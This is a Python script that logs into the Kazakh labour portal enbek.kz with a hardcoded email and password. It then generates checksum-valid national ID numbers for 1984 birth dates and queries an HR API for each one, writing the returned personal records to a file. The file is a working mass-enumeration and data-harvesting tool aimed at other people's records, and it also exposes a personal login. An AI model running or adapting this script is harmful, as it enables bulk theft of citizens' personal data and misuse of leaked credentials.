import aiohttp
import asyncio

def append_to_file(file_path, data):
    try:
        with open(file_path, 'a') as file:
            file.write(data + '\n')  # Assuming each data entry is on a new line
        print("Data appended successfully.")
    except Exception as e:
        print(f"Error: {e}")

async def make_request(session, iinCopy):
    async with session.get('https://hr.enbek.kz/api/contract/universalMethods/requestFlData?iin=' + iinCopy) as response:
        result = await response.text()
        print(iinCopy)
        print(result)
        append_to_file('a.txt', result)
        print()

async def main():
    url = 'https://passport.enbek.kz/ru/user/login'
    user_agent_val = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'

    async with aiohttp.ClientSession() as session:
        r = await session.get(url, headers={'User-Agent': user_agent_val})
        session.headers.update({'Referer': url})
        session.headers.update({'User-Agent': user_agent_val})

        post_request = await session.post(url, data={
            '_token': 'LMN2lxKRIsEw96R6BJaKfuEfRn8W9JKriFCJQcrA',
            'auth_type': 'email',
            'email': 'b.iliyas.2005@gmail.com',
            'password': 'Iliyas2005@',
        })

        for year in range(1984, 1985):
            for month in range(1, 13):
                for day in range(1, 32):
                    iin = str(year).replace(str(year)[0] + str(year)[1], "") + str(month).zfill(2) + str(day).zfill(2) + '4'
                    #indexStart = int(input("Start index : "))
                    #indexEnd = int(input("End index : "))
                    tasks = []
                    for i in range(1, 9999):
                        iinCopy = iin + str(i).zfill(4)
                        v = [int(digit) for digit in iinCopy]
                        is_actual = False
                        n12 = (sum((idx + 1) * val for idx, val in enumerate(v)) % 11)

                        if n12 == 10:
                            n12 = (sum((idx + 3) * val for idx, val in enumerate(v)) % 11)
                            if n12 != 10:
                                is_actual = True
                        else:
                            is_actual = True

                        if is_actual:
                            v.append(n12)
                            iinCopy = ''.join(map(str, v))
                            tasks.append(make_request(session, iinCopy))

                    await asyncio.gather(*tasks)
                print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nNew day')

if __name__ == "__main__":
    asyncio.run(main())
